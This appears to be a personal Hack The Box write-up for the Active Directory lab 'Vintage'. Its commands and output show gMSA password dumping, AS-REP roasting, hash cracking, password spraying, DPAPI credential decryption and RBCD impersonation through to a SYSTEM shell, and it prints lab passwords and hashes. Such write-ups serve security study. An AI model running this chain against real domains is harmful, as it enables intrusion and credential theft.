# User flag
## 1. rustscan
```python
Nmap scan report for 10.129.231.205
Host is up, received echo-reply ttl 127 (0.26s latency).
Scanned at 2025-03-30 08:31:34 EDT for 107s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-30 12:31:42Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55617/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
64521/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22961/tcp): CLEAN (Timeout)
|   Check 2 (port 34101/tcp): CLEAN (Timeout)
|   Check 3 (port 17035/udp): CLEAN (Timeout)
|   Check 4 (port 17944/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-03-30T12:32:35
|_  start_date: N/A
|_clock-skew: 0s
```

## 2. bloodhound
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ nxc ldap 10.129.245.39 -u P.Rosa -p Rosaisbest123 -k --bloodhound --collection all --dns-server 10.129.245.39
```

## 3. Check kerberoasting
![[Pasted image 20250330214213.png]]
## 3. ADCS
```python
┌──(kali㉿kali)-[~/Desktop/htb/test]
└─$ nxc ldap 10.129.245.39 -u 'gmsa01$' -H ':b3a15bbdfb1c53238d4b50ea2c4d1178' -k -M adcs

LDAP        10.129.245.39   389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
LDAP        10.129.245.39   389    dc01.vintage.htb [+] vintage.htb\gmsa01$:b3a15bbdfb1c53238d4b50ea2c4d1178 
ADCS        10.129.245.39   389    dc01.vintage.htb [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'

```

## 4. ldapsearch
```python
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName memberOf

ldapsearch: 这是用于查询 LDAP 目录的命令行工具。
-x: 表示使用简单身份验证，而不是 SASL 认证。
-H ldap://<IP>: 指定 LDAP 服务器的地址（用实际的 IP 地址替换 <IP>）。
-D "P.Rosa@vintage.htb": 绑定 DN（Distinguished Name），即用于登录 LDAP 服务器的用户凭证。
-w "Rosaisbest123": 指定绑定用户的密码。
-b "DC=vintage,DC=htb": 指定搜索的基础 DN（Base DN），即从哪个节点开始搜索 LDAP 目录。
"(objectClass=user)": 这是过滤器，用于指定只查询对象类为 user 的条目。
sAMAccountName memberOf: 指定要返回的属性。sAMAccountName 是用户的登录名，memberOf 表示用户所属的组。

# find this
# fs01, Computers, vintage.htb
dn: CN=fs01,CN=Computers,DC=vintage,DC=htb
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: FS01$
```

Refer: https://trustedsec.com/blog/diving-into-pre-created-computer-accounts
## 5. Pre-Windows 2000 Compatible Access
```
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ nxc ldap 10.129.245.39 -u fs01$ -p fs01 -k                 
LDAP        10.129.245.39   389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
LDAP        10.129.245.39   389    dc01.vintage.htb [+] vintage.htb\fs01$:fs01
```

![[Pasted image 20250415105432.png]]

## 6. Dump `GMSA01$` password
```python
┌──(kali㉿kali)-[~/Tools/windows/gMSADumper]
└─$ bloodyAD -k --host "dc01.vintage.htb" --dc-ip 10.129.245.39 -d "vintage.htb" -u "fs01$" -p "fs01" get object GMSA01$ --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==
```
## 6. Use `GMS01$` to perform AS-REP attack 
* [Windows UAC](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
![[Pasted image 20250415112500.png]]

```python
┌──(kali㉿kali)-[~/Desktop/htb/test]
└─$ GetNPUsers.py "vintage.htb/" -request -outputfile user_hash.txt -format hashcat -usersfile users 
/usr/local/bin/GetNPUsers.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250109.91705.ac02e0ee', 'GetNPUsers.py')
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$SVC_ARK@VINTAGE.HTB:f3f833255cf701d04584f4bc48f61f84$ed58c7b29123dc4e46f6ce50a9a01d3255e5e6543b9a178a1e7f7b075e4c70a0426870a7cf1e005b032d0d0bd5c976c97856341b4803b35446688778cfc96abe537ee1748a6e559a5bf2002c8c6cb36048464d135e42fdd99d6a243420e19af6c46b530e9405d6c49c7b5876e63b6e425e32bca397c61d2bc98f12bee32497f925aaf5e7499cbe40587a17ceed8529c07c11e14bb8de3f6a7c54c028e8359022b0e4e540f8c3ebb89bca1ac0ed583bdd1124a37b086eddbe52dfd3b25e1394d5cf58ee97ded5b693677b66dbc3c1fd65a2bf889bb2a33c4c0c0964454617baee7f3c96f3c7accb10d78e
$krb5asrep$23$SVC_LDAP@VINTAGE.HTB:8b3120cbd91dbd55d84a963ba88ab37a$782952265faff8c0dbc64f61dac6c418b131ef9d50acfc0a9d6c551484edab4989b6fb3b1b51a5b16e2bb9eece8ffc2970d0a1398bd4bb04629154df9d4e0e8e02318bd380164c0dd654191607f185ad5b71267ea28d751cb97160eea45df9a5c513fefb7c4edbd4b381b119c674ca6b208843cf1c43eac62f7b59a633da063c1326c8c86e8d1b35fd935b927a18d988bbd5bdcbaed1dd5d06b053d0357cced21b7f1a957b8629211a29c6f6fd56c7e895b15b72737d96aa24b63430a8952d9b81f789695141ed5483d25ff4babb39193863e5276b29b08dbb2d8c7d0bfc394a1cbbb91a0e6e7f986b05
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)

# We need to enable the account
┌──(kali㉿kali)-[~/Desktop/htb/test]
└─$ bloodyAD --host "dc01.VINTAGE.HTB" -d "vintage.htb" -k remove uac -f ACCOUNTDISABLE SVC_SQL   
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl
                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/htb/test]
└─$ GetNPUsers.py "vintage.htb/" -request -outputfile user_hash.txt -format hashcat -usersfile users 
/usr/local/bin/GetNPUsers.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250109.91705.ac02e0ee', 'GetNPUsers.py')
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$SVC_ARK@VINTAGE.HTB:aa25e30c69a410969b5f77965abb905b$087fdf2def398d135719a04e9f536dea3ac00cf6927783225500efcbf12438298a4d3a6782f49bd5b31b81a6ac0792d1cc987d97183e0725297912424173c5caffaee6c6cd518ce93452660843687ee49841d0acf8c7ab916464106317e8d676709740752fbbc71398209b7563d8825df5be5dba97e9c17a3e96a736cc1b93aa5a96db76732432c6c78a05221bb8906a223e667e30e85b4348038b8d9ba304c4c4989b499188148cbadc4a6c178e9b00791c3dabf6267613e1b8d73fa1068cb8c3cb7fb0d53667edce5c2795043cc6d419b03af6b92ab09afa7913e585d0d634852b979590f8e056fe0d
$krb5asrep$23$SVC_LDAP@VINTAGE.HTB:040a06abcca116a280ebac821dc19d33$ace5453f5fe9f25de0de2807c537fa63e616fbaea03508b1536c94ea42c9574fd3928a0d9b9a48104eee5f99125fbfbd8150c97ff73fe46dbec5bd82e48cf2b199334aa666774467483dc381aa33c3ad4fafb226bafb88f37d4c2d888adbad8c3f39d4742ba9c27c01eeb9f325ed2a0b5cb29a0cf4dadd7a52b6fdcabc9e71756b86f9d19931f675aca5ffa06b8cf4a63cd2773b62e0ac994b7ded54324b772fa3bbd5042dd5c80ad765e866e96ea95fcadb686f742f31c9e8b18338bd9206c1c3f6e9c6a5561c726bee1809d428bb692b8b4f8dd85597d5d57060daaf3027a817cf743006c161ee3ce2
$krb5asrep$23$SVC_SQL@VINTAGE.HTB:94ae5091badea4c9c4f1faa800d31fa2$efded8f1d36114280257bcdcc16de3a7c03d97a1fd1d48d038098a6e77ef268a94793b65800a08f964497c09bf91e61640f0fac6b44b89fa2bad7fefa08e165298eda2116c0eb89742d121d55e357be8f9e5a29d14a7c20bac86d986777bf9337eb829ee5c182b35965e4ace213d6eed8f0059d92017c552a25e8c3473fb70b354d1e87c18ec39860ab8c4385515e0bd0998e5137cb3a31af8b8ebe4718fd6d5fe06bc8da75617b31ffa8043e51d6db739cbeb2454253d5a3070ed925358045a82c20ed00dccb8b1d03d86cee9f85d32a54f950998fc0c722bb50819816a3cb04d25a0aac98b4b277019

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$SVC_SQL@VINTAGE.HTB:94ae5091badea4c9c4f1faa800d31fa2$efded8f1d36114280257bcdcc16de3a7c03d97a1fd1d48d038098a6e77ef268a94793b65800a08f964497c09bf91e61640f0fac6b44b89fa2bad7fefa08e165298eda2116c0eb89742d121d55e357be8f9e5a29d14a7c20bac86d986777bf9337eb829ee5c182b35965e4ace213d6eed8f0059d92017c552a25e8c3473fb70b354d1e87c18ec39860ab8c4385515e0bd0998e5137cb3a31af8b8ebe4718fd6d5fe06bc8da75617b31ffa8043e51d6db739cbeb2454253d5a3070ed925358045a82c20ed00dccb8b1d03d86cee9f85d32a54f950998fc0c722bb50819816a3cb04d25a0aac98b4b277019:Zer0the0ne
```

## 7. Password spray

```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ cme ldap 10.129.245.39 -u user -p Zer0the0ne -k --continue-on-success
LDAP        10.129.245.39   389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
LDAP        10.129.245.39   389    dc01.vintage.htb [+] vintage.htb\C.Neri:Zer0the0ne 
LDAP        10.129.245.39   389    dc01.vintage.htb [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.245.39   389    dc01.vintage.htb [+] vintage.htb\svc_sql:Zer0the0ne 
LDAP        10.129.245.39   389    dc01.vintage.htb [+] vintage.htb\svc_ldap account vulnerable to asreproast attack 
LDAP        10.129.245.39   389    dc01.vintage.htb [+] vintage.htb\svc_ark account vulnerable to asreproast attack 
LDAP        10.129.245.39   389    dc01.vintage.htb [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
LDAP        10.129.245.39   389    dc01.vintage.htb [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
```

## 8. Shell as `C.Neri`
* https://notes.benheater.com/books/active-directory/page/kerberos-authentication-from-kali
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ getTGT.py vintage.htb/'C.Neri':Zer0the0ne                        
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in C.Neri.ccache

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ cat kr5conf.sh       
#!/bin/bash

LOWER_REALM='vintage.htb'
UPPER_REALM=$(echo "$LOWER_REALM" | tr '[:lower:]' '[:upper:]')
DC_HOSTNAME='DC01'

cat << EOF | sed \
-e "s/{{REALM_PLACEHOLDER}}/$UPPER_REALM/g" \
-e "s/{{realm_placeholder}}/$LOWER_REALM/g" \
-e "s/{{dc_hostname}}/$DC_HOSTNAME/g" > custom_krb5.conf
[libdefaults]
    default_realm = {{REALM_PLACEHOLDER}}
    dns_lookup_realm = true
    dns_lookup_kdc = true

[realms]
    {{REALM_PLACEHOLDER}} = {
        kdc = {{dc_hostname}}.{{realm_placeholder}}
        admin_server = {{dc_hostname}}.{{realm_placeholder}}
        default_domain = {{dc_hostname}}.{{realm_placeholder}}
    }

[domain_realm]
    {{realm_placeholder}} = {{REALM_PLACEHOLDER}}
    .{{realm_placeholder}} = {{REALM_PLACEHOLDER}}
EOF


export KRB5_CONFIG="$PWD/custom_krb5.conf"
evil-winrm -i dc01.vintage.htb -r vintage.htb
```

# root flag

## 1. `DPAPI`

* https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets
* https://tierzerosecurity.co.nz/2024/01/22/data-protection-windows-api.html

```python
# Credential file
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> dir -h


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6

*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials>  [Convert]::ToBase64String((Get-Content -path "C4BB96844A5C9DD45D5B6A9859252BA6" -Encoding byte))
AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==


┌──(kali㉿kali)-[~/Desktop/htb]
└─$ echo "AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==" | base64 -d  > C4BB96844A5C9DD45D5B6A9859252BA6

# master key
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> dir -h


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred


┌──(kali㉿kali)-[~/Desktop/htb/dpapi]
└─$ dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
/usr/local/bin/dpapi.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250109.91705.ac02e0ee', 'dpapi.py')
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

## RBCD
![[Pasted image 20250415160135.png]]
```python

*Evil-WinRM* PS C:\Users\C.Neri\Documents> (get-Adcomputer -Identity dc01 -Properties *).'msDS-AllowedToActOnBehalfOfOtherIdentity'

Path Owner                  Access
---- -----                  ------
     BUILTIN\Administrators VINTAGE\DelegatedAdmins Allow

# check if we can add machine
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ nxc ldap 10.129.245.39 -u user -p Zer0the0ne -k -M maq

MAQ         10.129.245.39   389    dc01.vintage.htb [*] Getting the MachineAccountQuota
MAQ         10.129.245.39   389    dc01.vintage.htb MachineAccountQuota: 0

# enable the account again
┌──(kali㉿kali)-[~/Tools/windows/krbrelayx]
└─$ bloodyAD --host "dc01.VINTAGE.HTB" -d "vintage.htb" -k remove uac -f ACCOUNTDISABLE SVC_SQL
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl

# add spn to SVC_SQL
┌──(kali㉿kali)-[~/Tools/windows/krbrelayx]
└─$ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.129.245.39 -k set object "SVC_SQL" servicePrincipalName  -v "cifs/fake"  
[+] SVC_SQL's servicePrincipalName has been updated

# get TGT
┌──(kali㉿kali)-[~/Tools/windows/krbrelayx]
└─$ getTGT.py -dc-ip 'vintage.htb' 'vintage.htb'/'svc_sql':'Zer0the0ne'

[*] Saving ticket in svc_sql.ccache

#  RBCD
┌──(kali㉿kali)-[~/Tools/windows/krbrelayx]
└─$ getST.py  -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.129.245.39  -k 'vintage.htb/svc_sql:Zer0the0ne'

[*] Impersonating L.BIANCHI_ADM
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ export KRB5CCNAME=/home/kali/Desktop/htb/L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache 

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ smbexec.py -k -no-pass dc01.vintage.htb 

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
```